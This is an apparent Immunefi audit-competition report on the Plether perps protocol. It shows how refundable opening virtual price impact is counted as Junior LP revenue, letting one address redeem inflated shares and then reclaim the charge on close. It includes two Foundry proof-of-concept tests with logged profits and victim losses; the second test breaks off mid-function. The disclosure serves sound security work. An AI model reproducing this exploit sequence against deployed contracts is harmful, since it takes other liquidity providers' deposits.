# \#97722 [SC-Critical] Refundable opening VPI enters Junior NAV and lets an LP/trader take other LPs' USDG

**Submitted on Nov 2nd 2026 at 20:48:56 UTC by @CarlosMB for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97722
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Executive Summary

One ordinary attacker address holds Junior shares and a funded trader balance. After queuing redemption of the LP shares, the trader opens a LONG and pays positive virtual price impact (VPI). Settlement of the matured redemption lets the attacker LP claim a share value that includes that VPI. The trader then closes and receives a VPI rebate from the remaining pool cash. HousePool had booked the opening VPI as current revenue although the trader could still reclaim it. Another Junior LP loses principal. The sequence uses ordinary permissions and a neutral oracle mark; no privileged role is needed.

Two Foundry tests below execute this path against the frozen in-scope source with a six-component release-basket oracle and mocked Pyth observations and USDG. In the primary run, the attacker's combined LP proceeds and trader balance finish **1,378.836395 USDG ahead** while the original victim LP actually redeems **2,978.995776 USDG below its deposit**. In the second run, a new LP restores the exact pool depth before the trader closes; the attacker still finishes **1,351.159080 USDG ahead** and that new LP actually redeems **3,700.522904 USDG below its deposit**. This is direct loss of other LPs' deposited USDG in the local tests. The [competition scope](https://immunefi.com/audit-competition/plether/scope/) lists direct theft of user funds as **Critical**.

I reviewed the relevant source and both executed test outputs. The competition snapshot's `packages/perps/src` matches the v2.0.0 release source; both PoCs ran on that snapshot. The first affected release and a fixed release are not verified. No public-chain transaction was sent.

## Background

HousePool holds LP USDG for Senior and Junior tranches. Junior receives residual trading revenue and absorbs losses first. A Junior holder can request redemption after the deposit cooldown; HousePool later settles the matured epoch and funds the vault's redemption escrow. A trader's open and close have separate signed VPI charges or rebates in addition to execution fees and price PnL.

The primary setup has one attacker address deposit 5,900,000 USDG as a Junior LP and fund its trader balance with 100,000 USDG. A separate victim LP deposits 4,100,000 USDG. Senior and Junior each have a one-USDG seed. The attacker trader opens a 4,000,000-notional LONG with 30,000 USDG of margin. The market is active, the oracle updates pass fixture policy, and there are no pre-existing trader claims. The test uses the relevant values in `packages/perps/DEPLOYMENT.md`: VPI factor 0.01, maximum skew ratio 40%, initial margin 0.2%, maintenance margin 0.1%, execution fee 4 bps, and adverse-confidence multiplier 2,500 bps.

The tests use the repository's `BasePerpTest` fixture and install a six-component `PletherOracle` with the release script's feed IDs, weights, base prices, and inversion flags (`script/DeployPerpsArbitrumSepolia.s.sol`). Mock USDG and mock Pyth observations stand in for external components; the Engine, Router, HousePool, vault, oracle implementation, and accounting libraries follow the in-scope source. The selected observations produce a neutral basket mark of 1.00000000 and aggregate confidence of 9,982 eight-decimal price units, about 0.9982 bp.

The accounting boundary is that a charge still refundable to a trader at close must not become irreversible LP redemption value at the intermediate epoch.

## Vulnerability Details

The attacker LP first deposits Junior funds, waits out TrancheVault's deposit cooldown, and calls `requestRedeem` on its shares. TrancheVault queues the shares for a later epoch (packages/perps/src/TrancheVault.sol, requestRedeem and getMaturedRedeemHead). The attacker waits until the request is mature but does **not** settle it yet. This ordering lets the redemption use the NAV after the trader's next order.

The attacker trader then opens the LONG. The open planner computes VPI from the change in directional skew and includes it in the immediate trade cost along with the execution fee (packages/perps/src/libraries/OpenAccountingLib.sol, tryBuildOpenState):

~~~solidity
state.tradeCostAssets = state.vpiAssets + int256(state.executionFeeAssets);
~~~

The settlement sidecar transfers the positive trade cost and routes the pool's portion as current revenue (packages/perps/src/CfdEngineSettlementSidecar.sol, the open-settlement path):

~~~solidity
IHousePool(host.pool())
    .recordClaimantInflow(
        poolCashInflowAssets,
        IHousePool.ClaimantInflowKind.Revenue,
        IHousePool.ClaimantInflowCashMode.CashArrived
    );
~~~

HousePool.recordClaimantInflow increments accountedAssets for CashArrived. At LP reconciliation, terminal distributable equity starts from physical assets, subtracts existing trader claims, and applies the signed terminal **price** delta (packages/perps/src/libraries/HousePoolAccountingLib.sol, buildReconcileSnapshot):

~~~solidity
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
~~~

There is no subtraction here for the positive VPI accrued on the still-open position that may be rebated at close. The dedicated reserve target in packages/perps/src/libraries/CfdEnginePlanLib.sol, _negativeVpiReserveTarget, is positive only when a position's accrued VPI is negative; it does not reserve this positive accrual against LP NAV. The revenue waterfall credits residual revenue to Junior principal (packages/perps/src/libraries/HousePoolReconcilePlanLib.sol, planReconcile, and HousePoolWaterfallAccountingLib.sol, distributeRevenue). HousePool.settleLpEpoch reconciles before it snapshots Junior pricing principal and supply, then funds matured redemptions from available cash. With an open position, the Router supplies a fresh mark and calls this settlement atomically (packages/perps/src/OrderRouter.sol, settleLpEpoch; packages/perps/src/router/OrderLiquidationBatchLogic.sol, settleLpEpoch; packages/perps/src/HousePool.sol, settleLpEpoch and _settleLpEpoch). The PoC shows the attacker LP's full request funded and its shares claimed for **5,904,778.645039 USDG**, above its 5,900,000 USDG deposit.

Finally, the attacker trader closes the LONG without a change in the mock oracle's neutral mark. CloseAccountingLib.buildCloseState calculates a negative VPI for the skew-reducing close and caps it at the position's positive accrued VPI:

~~~solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
~~~

In the primary test, the immediately preceding close preview reports signed VPI of **-7,999.599205 USDG**, exactly equal in magnitude to the opening VPI; the test then observes a full close but does not decode the execution receipt's individual VPI field. The close planner pays an affordable net action rebate from free pool cash, after relevant fees and claims, and the settlement sidecar credits the trader (packages/perps/src/libraries/CfdEnginePlanLib.sol, the close action settlement; packages/perps/src/CfdEngineSettlementSidecar.sol, the close payout path). The position is fully closed. The rebate is not an unlimited or net-negative lifetime-VPI payment; the failure is that the attacker has already cashed out part of the opening VPI through the attacker LP's Junior shares.

The exact introducing change and first affected release are not established. The [v2.0.0 tag](https://github.com/Plether-Fi/plether-core/releases/tag/v2.0.0) and frozen competition snapshot have the same in-scope production source according to the [repository comparison](https://github.com/immunefi-team/audit-comp-plether/compare/1209ca8a5b94a4fb6323c7c4585846ed93db3932...a82d4fefb02768e5b3bddcc97dee371eee24fea8); earlier tags contain the opening Revenue path, but the complete attack was not checked on them. No shipped correction or backport was verified.


## Exploitability Analysis

The opening VPI is paid into HousePool, distributed into Junior principal, and included in the value the attacker LP withdraws. The attacker trader's later close reclaims VPI from pool cash. In the primary run, the victim LP receives **4,097,021.004224 USDG** against a **4,100,000 USDG** deposit. The attacker LP receives **5,904,778.645039 USDG**, and the trader account ends with **96,600.191356 USDG**. Combined, the attacker's LP proceeds and trader balance finish at **6,001,378.836395 USDG** against **6,000,000 USDG** initially supplied. The attack does not depend on a Sybil identity split: both PoCs pass with one attacker address. Protocol charges and other accounting effects mean the victim's entire loss is not asserted to be the attacker's proceeds.

The ordinary guards accept this sequence in the tests. The attacker LP requests redemption after cooldown and waits for maturity before the trader opens. The 4,000,000-notional LONG meets the configured 40% skew cap in the seeded 10,000,002-USDG pool and has enough margin. Permissionless Router execution and LP settlement accept the mock Pyth updates. The redemption is fully funded and the position fully closes.

**Why this is not the AI scan finding.** The published [“Temporary pool-liquidity reduction can amplify a skew-reducing close rebate”](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L1742) describes the close-time pool-depth denominator shrinking after LP withdrawal and thereby increasing the negative VPI rebate. This report concerns an earlier state change: opening VPI that remains refundable to the trader is booked as HousePool Revenue, added to Junior NAV, and paid to the attacker LP at redemption. In the primary test, previewing close at the original depth changes the rebate by only **5.596483 USDG** against an executed attacker gain of **1,378.836395 USDG**. In the second executed test, a new LP restores HousePool depth exactly to its pre-withdrawal **10,008,001.599205 USDG** before close; actual-depth and reference-depth close previews then both show **7,993.985096 USDG** of rebate. The attacker still gains **1,351.159080 USDG**, and the new LP actually loses **3,700.522904 USDG**. The scan's depth amplification is absent in that close preview, while the redeemable opening-VPI accounting and resulting loss remain. A change confined to the close VPI denominator would leave the earlier NAV capitalization and redemption path untouched.

The restored-depth run needs an independent LP to supply **5,904,778.645039 USDG** and an additional deposit epoch while the trader's position remains open; carry and share-entry pricing therefore differ from the primary run. The original victim LP's estimated NAV rises in this variant; the replenishing LP bears the demonstrated actual-payout loss. The tests use mock Pyth and USDG and exclude live gas and capital costs; neither measures deployment prevalence. 

## Proof of Concept

The complete sources and full observed outputs are embedded below. Each test was run against the frozen competition commit using Foundry 1.8.3 and Solidity 0.8.35. The oracle implementation, Engine, Router, HousePool, vault, and accounting libraries are the in-scope code; only Pyth observations and USDG are mocks. The six feed IDs, weights, base prices, and inversion flags match the release deployment script. `BasePerpTest` deploys a Router harness in the fixture, but these PoCs call its inherited production typed V3 `commitOrder(OrderV3Types.OrderRequest)` overload directly. Their `vm.getBlockTimestamp()` use constructs a fresh order deadline after local `vm.warp`; it is test scheduling, not an exploit precondition. In both tests, `ATTACKER_TRADER = ATTACKER_LP`, so the same address acts in both roles. The setup applies documented risk values through normal fixture/admin helpers; those setup calls are **not** an attacker privilege. Both tests leave in-scope contracts unmodified. Use a disposable checkout with its Foundry dependencies and solc 0.8.35 available.

The [competition resources](https://immunefi.com/audit-competition/plether/resources/) specify the pinned repository, submodules, and Solidity 0.8.35. Prepare a fresh checkout before copying either test:

```sh
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
```

Install Solidity 0.8.35 before running the `--offline` test commands below; `make build-perps` can fetch it if needed.

### PoC 1 — redeem opening VPI, then close

Save the following complete source as `packages/perps/test/validation/VpiSingleAddressV3.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {console2} from "forge-std/console2.sol";

contract VpiSingleAddressV3ValidationTest is BasePerpTest {
    address internal constant ATTACKER_LP = address(0xA11CE);
    address internal constant VICTIM_LP = address(0xB0B);
    address internal constant ATTACKER_TRADER = ATTACKER_LP;

    function _releaseFeedIds() internal pure returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        ids[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        ids[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        ids[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        ids[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        ids[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        ids[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
    }

    function _releaseRawPrices() internal pure returns (int64[] memory prices) {
        prices = new int64[](6);
        prices[0] = 117_500_000;
        prices[1] = 15_673_981_191;
        prices[2] = 134_480_000;
        prices[3] = 137_211_855;
        prices[4] = 920_810_313;
        prices[5] = 79_302_141;
    }

    function setUp() public override {
        super.setUp();
        bytes32[] memory ids = _releaseFeedIds();
        int64[] memory raw = _releaseRawPrices();
        uint256[] memory weights = new uint256[](6);
        weights[0] = 576e15; weights[1] = 136e15; weights[2] = 119e15;
        weights[3] = 91e15; weights[4] = 42e15; weights[5] = 36e15;
        uint256[] memory bases = new uint256[](6);
        bases[0] = 117_500_000; bases[1] = 638_000; bases[2] = 134_480_000;
        bases[3] = 72_880_000; bases[4] = 10_860_000; bases[5] = 126_100_000;
        bool[] memory inversions = new bool[](6);
        inversions[1] = true; inversions[3] = true;
        inversions[4] = true; inversions[5] = true;

        for (uint256 i; i < 6; ++i) {
            baseMockPyth.setPrice(ids[i], raw[i], uint64(uint64(raw[i]) / 10_000), -8, block.timestamp);
        }
        PletherOracle releaseOracle = new PletherOracle(
            address(engine), address(pool), address(baseMockPyth), ids, weights, bases, inversions
        );

        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2_500;
        config.basketMaxConfidenceRatioBps = 10;
        config.minOpenNotionalAssets = 1_000e6;
        config.maxPendingOrders = 5;
        routerAdmin.proposeRouterConfig(config);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(releaseOracle)));
        vm.warp(routerAdmin.routerConfigActivationTime());
        routerAdmin.finalizeRouterConfig();
        routerAdmin.finalizeOracleConfig();
        pletherOracle = releaseOracle;
        for (uint256 i; i < 6; ++i) {
            baseMockPyth.setPrice(ids[i], raw[i], uint64(uint64(raw[i]) / 10_000), -8, block.timestamp);
        }
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _oneBpPriceUpdate() internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        bytes32[] memory ids = _releaseFeedIds();
        int64[] memory raw = _releaseRawPrices();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                ids[i],
                MockPyth.MockPrice(raw[i], uint64(uint64(raw[i]) / 10_000), -8, publishTime, publishTime - 1)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _v3Request(
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        uint256 targetPrice,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        // Mirror the harness's V3 bounds, then submit through the production overload.
        // Foundry can warp time inside this test, so read its current timestamp explicitly.
        bytes32 clientOrderId = bytes32(uint256(router.nextCommitId()));
        if (targetPrice == 0) {
            targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        }
        uint256 maxWindow = router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: clientOrderId,
            side: side,
            sizeDelta: sizeDelta,
            marginDelta: marginDelta,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(maxWindow),
                executionWindowSeconds: uint32(maxWindow),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }
    function test_SingleAddressV3OpenRedeemClose() public {
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2_500);

        uint256 attackerDeposit = 5_900_000e6;
        uint256 victimDeposit = 4_100_000e6;
        uint256 traderFunding = 100_000e6;
        uint256 tradeSize = 4_000_000e18;

        _fundJunior(ATTACKER_LP, attackerDeposit);
        _fundJunior(VICTIM_LP, victimDeposit);
        _fundTrader(ATTACKER_TRADER, traderFunding);

        uint256 attackerShares = juniorVault.balanceOf(ATTACKER_LP);
        uint256 victimShares = juniorVault.balanceOf(VICTIM_LP);
        uint256 ready = juniorVault.lastDepositTime(ATTACKER_LP) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < ready) vm.warp(ready);

        vm.prank(ATTACKER_LP);
        uint256 redeemId = juniorVault.requestRedeem(attackerShares, ATTACKER_LP, ATTACKER_LP);
        vm.warp(pool.lpEpochStart(redeemId));
        uint256 victimPrincipalBefore = juniorVault.estimateRedeemAssets(victimShares);

        OrderV3Types.OrderRequest memory openRequest =
            _v3Request(CfdTypes.Side.LONG, tradeSize, 30_000e6, 99_000_000, false);
        vm.prank(ATTACKER_TRADER);
        router.commitOrder(openRequest);
        router.executeOrder(1, _oneBpPriceUpdate());
        (,,,,,, int256 paidVpi) = engine.positions(ATTACKER_TRADER);
        assertGt(paidVpi, 0, "open must pay positive VPI");
        uint256 depthWithoutRedemption = pool.totalAssets();

        router.settleLpEpoch(_oneBpPriceUpdate());
        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemId, ATTACKER_LP);
        assertEq(claimableShares, attackerShares, "redemption must be fully funded");
        vm.prank(ATTACKER_LP);
        uint256 redeemedAssets = juniorVault.claimRedeem(
            redeemId, claimableShares, ATTACKER_LP, ATTACKER_LP
        );
        assertGt(redeemedAssets, attackerDeposit, "LP must realize open VPI in share price");

        (, uint256 confidence) = pletherOracle.getLatestPoolReconcilePrice();
        uint256 closePrice = pletherOracle.getLatestPrice()
            + confidence * pletherOracle.adverseConfidenceMultiplierBps() / 10_000;
        ICfdEngineTypes.ClosePreview memory actualDepthClose =
            engineLens.previewClose(ATTACKER_TRADER, tradeSize, closePrice);
        ICfdEngineTypes.ClosePreview memory fullDepthClose =
            engineLens.simulateClose(ATTACKER_TRADER, tradeSize, closePrice, depthWithoutRedemption);
        console2.log("neutral mark price", pletherOracle.getLatestPrice());
        console2.log("aggregate confidence", confidence);
        assertEq(actualDepthClose.vpiDeltaAssets, -paidVpi, "close VPI is capped at open VPI");
        assertLt(fullDepthClose.vpiDeltaAssets, 0, "full-depth close still rebates VPI");
        uint256 depthAmplificationAtoms = uint256(-actualDepthClose.vpiDeltaAssets)
            - uint256(-fullDepthClose.vpiDeltaAssets);
        assertLt(depthAmplificationAtoms, 10e6, "depth amplification is small");
        console2.log("close VPI rebate atoms", uint256(-actualDepthClose.vpiDeltaAssets));
        console2.log("full-depth close VPI rebate atoms", uint256(-fullDepthClose.vpiDeltaAssets));
        console2.log("depth amplification atoms", depthAmplificationAtoms);

        OrderV3Types.OrderRequest memory closeRequest =
            _v3Request(CfdTypes.Side.LONG, tradeSize, 0, 200_000_000, true);
        vm.prank(ATTACKER_TRADER);
        router.commitOrder(closeRequest);
        router.executeOrder(2, _oneBpPriceUpdate());

        (uint256 remainingSize,,,,,,) = engine.positions(ATTACKER_TRADER);
        assertEq(remainingSize, 0, "closing order must execute fully");

        uint256 traderBalanceAfter = clearinghouse.balanceAssets(ATTACKER_TRADER);
        uint256 victimPrincipalAfter = juniorVault.estimateRedeemAssets(victimShares);
        uint256 combinedAfter = redeemedAssets + traderBalanceAfter;
        uint256 combinedBefore = attackerDeposit + traderFunding;

        console2.log("open positive VPI atoms", uint256(paidVpi));
        console2.log("redeemed assets atoms", redeemedAssets);
        console2.log("trader balance after atoms", traderBalanceAfter);
        console2.log("attacker combined after atoms", combinedAfter);
        console2.log("attacker combined before atoms", combinedBefore);
        console2.log("victim principal before atoms", victimPrincipalBefore);
        console2.log("victim principal after atoms", victimPrincipalAfter);
        console2.log("attacker net gain atoms", combinedAfter - combinedBefore);
        console2.log("victim principal loss atoms", victimPrincipalBefore - victimPrincipalAfter);

        assertGt(combinedAfter, combinedBefore, "attacker LP + trader should profit");
        assertLt(victimPrincipalAfter, victimPrincipalBefore, "victim LP principal should fall");

        vm.prank(VICTIM_LP);
        uint256 victimRedeemId = juniorVault.requestRedeem(victimShares, VICTIM_LP, VICTIM_LP);
        vm.warp(pool.lpEpochStart(victimRedeemId));
        router.settleLpEpoch(_oneBpPriceUpdate());
        uint256 victimClaimable = juniorVault.claimableRedeemRequest(victimRedeemId, VICTIM_LP);
        assertEq(victimClaimable, victimShares, "victim exit must be fully funded");
        vm.prank(VICTIM_LP);
        uint256 victimPaid = juniorVault.claimRedeem(victimRedeemId, victimShares, VICTIM_LP, VICTIM_LP);
        console2.log("victim actually paid atoms", victimPaid);
        assertLt(victimPaid, victimDeposit, "victim must actually receive less than principal");
    }
}
```

From the checkout root, run:

```sh
forge test --root packages/perps --skip test/perps --match-path test/validation/VpiSingleAddressV3.t.sol --offline --use 0.8.35 -vv
```

Full observed output (USDG amounts are six-decimal atoms):

```text
No files changed, compilation skipped

Ran 1 test for test/validation/VpiSingleAddressV3.t.sol:VpiSingleAddressV3ValidationTest
[PASS] test_SingleAddressV3OpenRedeemClose() (gas: 13740797)
Logs:
  neutral mark price 100000000
  aggregate confidence 9982
  close VPI rebate atoms 7999599205
  full-depth close VPI rebate atoms 7994002722
  depth amplification atoms 5596483
  open positive VPI atoms 7999599205
  redeemed assets atoms 5904778645039
  trader balance after atoms 96600191356
  attacker combined after atoms 6001378836395
  attacker combined before atoms 6000000000000
  victim principal before atoms 4099999999996
  victim principal after atoms 4097021004233
  attacker net gain atoms 1378836395
  victim principal loss atoms 2978995763
  victim actually paid atoms 4097021004224

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 17.74ms (10.27ms CPU time)

Ran 1 test suite in 32.45ms (17.74ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The attacker LP's redemption is fully funded, the trader position closes completely, and the victim LP actually claims less than its deposit. The close VPI and full-depth VPI figures are **previews**; the test does not decode the execution receipt's individual VPI field.

### PoC 2 — restore pool depth before close

Save the following complete source as `packages/perps/test/validation/VpiRestoredDepthSingleAddressV3.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {console2} from "forge-std/console2.sol";

contract VpiRestoredDepthSingleAddressV3ValidationTest is BasePerpTest {
    address internal constant ATTACKER_LP = address(0xA11CE);
    address internal constant VICTIM_LP = address(0xB0B);
    address internal constant ATTACKER_TRADER = ATTACKER_LP;
    address internal constant RESTORER_LP = address(0xD00D);

    function _releaseFeedIds() internal pure returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        ids[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        ids[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        ids[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        ids[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        ids[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        ids[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
    }

    function _releaseRawPrices() internal pure returns (int64[] memory prices) {
        prices = new int64[](6);
        prices[0] = 117_500_000;
        prices[1] = 15_673_981_191;
        prices[2] = 134_480_000;
        prices[3] = 137_211_855;
        prices[4] = 920_810_313;
        prices[5] = 79_302_141;
    }

    function setUp() public override {
        super.setUp();
        bytes32[] memory ids = _releaseFeedIds();
        int64[] memory raw = _releaseRawPrices();
        uint256[] memory weights = new uint256[](6);
        weights[0] = 576e15; weights[1] = 136e15; weights[2] = 119e15;
        weights[3] = 91e15; weights[4] = 42e15; weights[5] = 36e15;
        uint256[] memory bases = new uint256[](6);
        bases[0] = 117_500_000; bases[1] = 638_000; bases[2] = 134_480_000;
        bases[3] = 72_880_000; bases[4] = 10_860_000; bases[5] = 126_100_000;
        bool[] memory inversions = new bool[](6);
        inversions[1] = true; inversions[3] = true;
        inversions[4] = true; inversions[5] = true;

        for (uint256 i; i < 6; ++i) {
            baseMockPyth.setPrice(ids[i], raw[i], uint64(uint64(raw[i]) / 10_000), -8, block.timestamp);
        }
        PletherOracle releaseOracle = new PletherOracle(
            address(engine), address(pool), address(baseMockPyth), ids, weights, bases, inversions
        );

        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2_500;
        config.basketMaxConfidenceRatioBps = 10;
        config.minOpenNotionalAssets = 1_000e6;
        config.maxPendingOrders = 5;
        routerAdmin.proposeRouterConfig(config);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(releaseOracle)));
        vm.warp(routerAdmin.routerConfigActivationTime());
        routerAdmin.finalizeRouterConfig();
        routerAdmin.finalizeOracleConfig();
        pletherOracle = releaseOracle;
        for (uint256 i; i < 6; ++i) {
            baseMockPyth.setPrice(ids[i], raw[i], uint64(uint64(raw[i]) / 10_000), -8, block.timestamp);
        }
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _oneBpPriceUpdate() internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        bytes32[] memory ids = _releaseFeedIds();
        int64[] memory raw = _releaseRawPrices();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                ids[i],
                MockPyth.MockPrice(raw[i], uint64(uint64(raw[i]) / 10_000), -8, publishTime, publishTime - 1)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _v3Request(
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        uint256 targetPrice,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        // Mirror the harness's V3 bounds, then submit through the production overload.
        // Foundry can warp time inside this test, so read its current timestamp explicitly.
        bytes32 clientOrderId = bytes32(uint256(router.nextCommitId()));
        if (targetPrice == 0) {
            targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        }
        uint256 maxWindow = router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: clientOrderId,
            side: side,
            sizeDelta: sizeDelta,
            marginDelta: marginDelta,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(maxWindow),
                executionWindowSeconds: uint32(maxWindow),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }
    function test_RestoredDepthSingleAddressV3StillTransfersNewLpPrincipal() public {
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2_500);

        uint256 attackerDeposit = 5_900_000e6;
        uint256 victimDeposit = 4_100_000e6;
        uint256 traderFunding = 100_000e6;
        uint256 tradeSize = 4_000_000e18;

        _fundJunior(ATTACKER_LP, attackerDeposit);
        _fundJunior(VICTIM_LP, victimDeposit);
        _fundTrader(ATTACKER_TRADER, traderFunding);

        uint256 attackerShares = juniorVault.balanceOf(ATTACKER_LP);
        uint256 victimShares = juniorVault.balanceOf(VICTIM_LP);
        uint256 ready = juniorVault.lastDepositTime(ATTACKER_LP) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < ready) vm.warp(ready);

        vm.prank(ATTACKER_LP);
        uint256 redeemId = juniorVault.requestRedeem(attackerShares, ATTACKER_LP, ATTACKER_LP);
        vm.warp(pool.lpEpochStart(redeemId));
        uint256 victimPrincipalBefore = juniorVault.estimateRedeemAssets(victimShares);

        OrderV3Types.OrderRequest memory openRequest =
            _v3Request(CfdTypes.Side.LONG, tradeSize, 30_000e6, 99_000_000, false);
        vm.prank(ATTACKER_TRADER);
        router.commitOrder(openRequest);
        router.executeOrder(1, _oneBpPriceUpdate());
        (,,,,,, int256 paidVpi) = engine.positions(ATTACKER_TRADER);
        assertGt(paidVpi, 0, "open must pay positive VPI");
        uint256 depthWithoutRedemption = pool.totalAssets();

        router.settleLpEpoch(_oneBpPriceUpdate());
        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemId, ATTACKER_LP);
